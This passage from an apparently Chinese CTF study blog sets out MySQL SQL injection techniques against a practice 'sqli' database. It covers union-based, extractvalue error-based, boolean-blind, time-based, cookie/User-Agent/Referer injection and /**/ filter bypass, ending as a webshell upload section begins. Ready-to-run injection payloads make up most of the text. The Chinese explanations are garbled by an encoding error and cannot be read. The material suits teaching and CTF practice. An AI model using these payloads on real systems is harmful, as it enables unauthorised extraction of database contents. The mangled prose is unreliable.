class="string">&#x27; order by 2 # è¿”å›æ­£ç¡®</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # è¿”å›é”™è¯¯</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,database()</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µå†…å®¹ï¼ˆflagï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(flag) from sqli.flag</span></span><br></pre></td></tr></table></figure><h4><span id="æŠ¥é”™æ³¨å…¥">æŠ¥é”™æ³¨å…¥</span></h4><figure class="highlight plaintext"><figcaption><span>:å¯¹[XML](https://so.csdn.net/so/search?q</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)```</span><br><span class="line"></span><br><span class="line">&gt; ç¬¬ä¸€ä¸ªå‚æ•° : ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ç›®æ ‡xmlæ–‡æ¡£</span><br><span class="line">&gt;</span><br><span class="line">&gt; ç¬¬äºŒä¸ªå‚æ•°ï¼š xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</span><br><span class="line">&gt;</span><br><span class="line">&gt; å¯ä»¥ç”¨ 0x5c  (â€˜\)ï¼Œè¿˜å¯ä»¥ä½¿ç”¨0x7e (~)ï¼Œä½¿å¾—sqléæ³•</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p><strong>midå‡½æ•°</strong></p><blockquote><p>MID()å‡½æ•°ç”¨äºä»æ–‡æœ¬å­—æ®µä¸­æå–å­—ç¬¦ã€‚ SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>column_name</td><td>å¿…éœ€ã€‚è¦æå–å­—ç¬¦çš„å­—æ®µã€‚</td></tr><tr><td>start</td><td>å¿…éœ€ã€‚è§„å®šå¼€å§‹ä½ç½®ï¼ˆèµ·å§‹å€¼æ˜¯ 1ï¼‰ã€‚</td></tr><tr><td>length</td><td>å¯é€‰ã€‚è¦è¿”å›çš„å­—ç¬¦æ•°ã€‚å¦‚æœçœç•¥ï¼Œåˆ™ MID() å‡½æ•°è¿”å›å‰©ä½™æ–‡æœ¬ã€‚</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">16</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">17</span>),<span class="number">0x7e</span>))</span><br><span class="line"># æ‹¼æ¥å¾—åˆ°flag</span><br></pre></td></tr></table></figure><h4><span id="å¸ƒå°”æ³¨å…¥">å¸ƒå°”æ³¨å…¥</span></h4><p>åªä¼šè¿”å›æ­£ç¡®æˆ–è€…é”™è¯¯ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ„é€ <code>if</code>è¯­å¥è¿›è¡Œæ³¨å…¥ï¼Œæ‰‹åŠ¨è¿‡ç¨‹ä¾›å‚è€ƒï¼Œè¿˜æ˜¯ç”¨sqlmapé è°±ã€‚</p><ul><li>å…ˆçŒœæµ‹æ•°æ®åº“é•¿åº¦</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">&gt;</span><span class="number">5</span> # ç»“æœæ˜¯error</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">=</span><span class="number">4</span> # ç»“æœæ˜¯success</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹æ•°æ®åº“å</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span> # å¯ä»¥äºŒåˆ†æ³•æ¥ç¡®è®¤æ¯ä¸ªå­—æ¯ </span><br></pre></td></tr></table></figure><ul><li>å¾—åˆ°æ•°æ®åº“è¡¨ä¸­æ•°é‡</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>å¾—åˆ°è¡¨å</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬ä¸€å¼ æ•°æ®è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬ä¸€å¼ æ•°æ®è¡¨çš„ç¬¬äºŒä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬ä¸€å¼ æ•°æ®è¡¨çš„ç¬¬ä¸‰ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># æœ€åå¾—åˆ°è¡¨åä¸ºnews</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬äºŒå¼ æ•°æ®è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬äºŒå¼ æ•°æ®è¡¨çš„ç¬¬äºŒä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬äºŒå¼ æ•°æ®è¡¨çš„ç¬¬ä¸‰ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># æœ€åå¾—åˆ°è¡¨åä¸ºflag</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹flagè¡¨çš„å­—æ®µæ•°</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># å¾—åˆ°flagåªæœ‰ä¸€ä¸ªå­—æ®µ</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹å­—æ®µå</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line">#(ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠå­—æ®µåçŒœè§£å‡ºæ¥)</span><br><span class="line">#......</span><br><span class="line">#å¾—åˆ°å­—æ®µåä¹Ÿä¸ºflag</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹flag</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">#......</span><br><span class="line">#è¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„å·¥ä½œé‡ï¼Œæ‰€ä»¥åº”è¯¥ç§¯ç´¯åˆ°çš„ä¸€ä¸ªç»éªŒæ˜¯ï¼š</span><br><span class="line">#æ‰‹å·¥ç›²æ³¨ç‰¹åˆ«ç¹çï¼Œç¢°åˆ°è¿™ç±»é¢˜ç›®è¦ä¼šç”¨å·¥å…·sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="mysqlç»“æ„">MySQLç»“æ„</span></h4><h4><span id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</span></h4><p>åŸç†å’Œå¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œé€šè¿‡è¿”å›æ—¶é—´æ¥åˆ¤æ–­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((substr(database(),<span class="number">1</span>,<span class="number">1</span>)=&#x27;s&#x27;),sleep(<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4><span id="cookieæ³¨å…¥">cookieæ³¨å…¥</span></h4><p>é¦–å…ˆé€šè¿‡æŠ“åŒ…ï¼Œå‘ç°æµè§ˆå™¨è¿”å›cookie: id&#x3D;1</p><p>ä½¿ç”¨postmanè¿›è¡Œå‘åŒ…å¤„ç†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # <span class="number">1</span>å’Œ<span class="number">2</span>å‡å¯å›æ˜¾ï¼Œè¯´æ˜æ•°æ®åº“æœ‰ä¸¤è¡Œ</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>ï¼›# æŸ¥çœ‹é¡µé¢å›æ˜¾ä½ï¼Œå‘ç°<span class="number">1</span>ï¼Œ<span class="number">2</span>éƒ½å¯ä»¥è¿›è¡Œå›æ˜¾</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),database() # å¼€å§‹æ³¨å…¥ï¼Œè·å–æ•°æ®åº“ç‰ˆæœ¬å’Œæ•°æ®åº“å </span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> # å› ä¸ºæ•°æ®åº“ç‰ˆæœ¬å¤§äº<span class="number">5.0</span>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥è¯¢information_schemaè¡¨æ¥è·å–è¡¨åå’Œåˆ—åï¼Œè·å¾—è¡¨åç§°ä¸ºgdctsoiitj</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;gdctsoiitj&#x27;</span> # å¾—åˆ°è¡¨ååï¼Œç»§ç»­æŸ¥è¯¢åˆ—åï¼Œè·å¾—åˆ—åç§°ä¸ºzrxzhzkosa</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> zrxzhzkosa,<span class="number">2</span> <span class="keyword">from</span> gdctsoiitj # å¾—åˆ°åˆ—ååï¼ŒæŸ¥è¯¢æ•°æ®å¾—åˆ°flagï¼Œéœ€è¦æ³¨æ„è¿™é¢˜çš„è¡¨åå’Œåˆ—åæ¯ä¸ªç¯å¢ƒéƒ½ä¸ä¸€æ ·</span><br></pre></td></tr></table></figure><ul><li><p>ä¸ºä»€ä¹ˆid&#x3D;-1è€Œä¸æ˜¯1</p><blockquote><pre><code> 1. ç»è¿‡æŸ¥é˜…èµ„æ–™å¾—çŸ¥ï¼Œæ•°æ®åº“ä¸­idçš„æ•°æ®ç±»å‹è®¾ç½®ä¸ºintï¼ˆæ•°å€¼ç±»å‹ï¼‰å°±ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œå¦‚æœæ•°æ®åº“æ£€æŸ¥åˆ°idçš„å‚æ•°å¹¶ä¸ä¸ºæ•°å€¼çš„è¯ï¼Œå°±ä¼šå‘ç”Ÿç±»å‹è½¬æ¢ 2. æœ¬é¢˜ID=1ï¼Œæˆ‘æƒ³æ³¨å…¥çš„æ—¶å€™å°±ä¸èƒ½å†æ³¨ID=1äº†(è¦æŸ¥è¯¢æ•°æ®åº“ä¸å­˜åœ¨çš„ç»“æœï¼Œå¦åˆ™å­˜åœ¨çš„ç»“æœå ä½æ˜¾ç¤ºæˆ‘ä»¬å°±çœ‹ä¸åˆ°ç¬¬äºŒè¡Œçš„æ•°æ®) 3. ç”¨è”åˆæŸ¥è¯¢è¯­å¥union selectè¯­å¥æ¥æ³¨å…¥ï¼Œä»è€Œåˆ¤æ–­æ˜¾ç¤ºä½,åŒæ—¶ä¹Ÿæ˜¯åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œæ­¤æ—¶è¦å…ˆä¿è¯ä¹‹å‰çš„æ•°æ®æŸ¥ä¸å‡ºæ¥æ‰èƒ½åˆ¤æ–­æ³¨å…¥ä½ç½®ï¼Œä¸ç„¶å°±ä¼šä¸€ç›´åœ¨æ³¨å…¥å½“å‰çš„æ•°æ®åº“ï¼Œæ— æ³•æ³¨å…¥æ–°çš„å€¼æ¥åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œä¹‹åå†union select id=-1æ•°æ®ä¸å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä½ç½®2å¯ä»¥æ’å…¥SQLè¯­å¥ã€‚</code></pre><p>æ€»ç»“ä¸€ä¸‹ï¼š<br>æ¯”å¦‚å­—ç¬¦ä¸²â€™1â€™ä¼šè¢«è½¬æ¢ä¸º1</p><p>æ¯”å¦‚å­—ç¬¦ä¸²â€™1â€â€˜ä¼šè¢«è½¬æ¢ä¸º1</p><p>æ¯”å¦‚â€™1 and 1&#x3D;1â€™ä¼šè¢«è¯†åˆ«ä¸º1</p><p>æ¯”å¦‚â€™1 and 1&#x3D;2â€™ä¼šè¢«è¯†åˆ«ä¸º1</p><p>æ¯”å¦‚â€™1akbucbdadbaiudadbabdaudâ€™ä¼šè¢«è¯†åˆ«ä¸º1</p><p>æ¯”å¦‚â€™23adasuasdai32ansoihaâ€™ä¼šè¢«è¯†åˆ«ä¸º23</p><p>å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦å¯ä»¥æ˜¯ä»»æ„çš„ï¼Œç±»å‹è½¬æ¢æ—¶éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸ä¼šå¯¹æ•°å€¼æœ‰ä»»ä½•çš„å½±å“</p></blockquote></li><li><p>ä¸ºä»€ä¹ˆè¦ç”¨åˆ°<code>group_concat</code></p><blockquote><p>å› ä¸ºéœ€è¦åœ¨ä¸€è¡Œè¾“å‡ºæ‰€æœ‰çš„ç»“æœ</p></blockquote></li></ul><h4><span id="uaæ³¨å…¥">UAæ³¨å…¥</span></h4><ul><li>å’Œcookieæ³¨å…¥æµç¨‹ä¸€è‡´</li></ul><h4><span id="refereræ³¨å…¥">Refereræ³¨å…¥</span></h4><ul><li>å’Œcookieæ³¨å…¥æµç¨‹ä¸€è‡´</li></ul><h4><span id="è¿‡æ»¤ç©ºæ ¼">è¿‡æ»¤ç©ºæ ¼</span></h4><p>éšç€é»‘å®¢æŠ€æœ¯çš„æå‡ï¼Œæˆ‘ä»¬å¼€å‘äººå‘˜çš„é˜²æŠ¤æªæ–½ä¹Ÿè¶Šæ¥è¶Šå¤šï¼Œä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ï¼Œå¼€å‘äººå‘˜é€šå¸¸ä¼šåœ¨åå°è¿‡æ»¤æŸäº›éæ­£å¸¸ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ï¼Œä¾‹å¦‚unionã€selectã€å•å¼•å·åŒå¼•å·ç­‰ç­‰ã€‚</p><ul><li>å¯ä»¥é€šè¿‡&#x2F;**&#x2F;æ¥ä»£æ›¿ç©ºæ ¼</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> # å‘ç°è¢«è¿‡æ»¤äº†</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="operator">=</span><span class="comment">/**/</span><span class="number">1</span> # å‘ç°æ­£ç¡®ï¼Œç»§ç»­æ„é€ payloadè¯­å¥ï¼Œå‘ç°ç­‰äº<span class="number">2</span>æ—¶å›æ˜¾é”™è¯¯ï¼Œè¯´æ˜æ­¤é¢˜å­˜åœ¨è¿‡æ»¤ç©ºæ ¼æ³¨å…¥</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">2</span> # æŸ¥çœ‹æœ‰å‡ ä½</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # å‘ç°æ— å›æ˜¾ï¼Œéœ€è¦åŠ è´Ÿå·æ“ä½œ</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # æˆåŠŸå‘ç°å›æ˜¾</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,version() # å‘ç°å›æ˜¾ä½</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database()</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(schema_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.schemata # æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;lqsyncyuso&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(nuyietobbn)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sqli.lqsyncyuso</span><br></pre></td></tr></table></figure><h3><span id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </span></h3><ul><li>tips: MacBookä¸Šæœ‰ä¸ªå‘ï¼Œä¸Šä¼ éšè—æ–‡ä»¶æ—¶å€™éœ€è¦é…åˆå‘½ä»¤<code>command+shift+.</code></li></ul><h4><span id="æ— éªŒè¯">æ— éªŒè¯</span></h4><ol><li>é€šè¿‡Wappalyzeræ¥æŸ¥çœ‹å½“å‰é¡µé¢çš„åŸºç¡€ç¯å¢ƒï¼Œå¦‚ä¸­é—´ä»¶ï¼Œå‰åç«¯è¯­è¨€ç­‰ </li><li>å°†ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ åˆ°æœåŠ¡å™¨</li></ol><ul><li>phpçš„ä¸€å¥è¯æœ¨é©¬</li></ul><figure class="highlight php"><table><tr><td 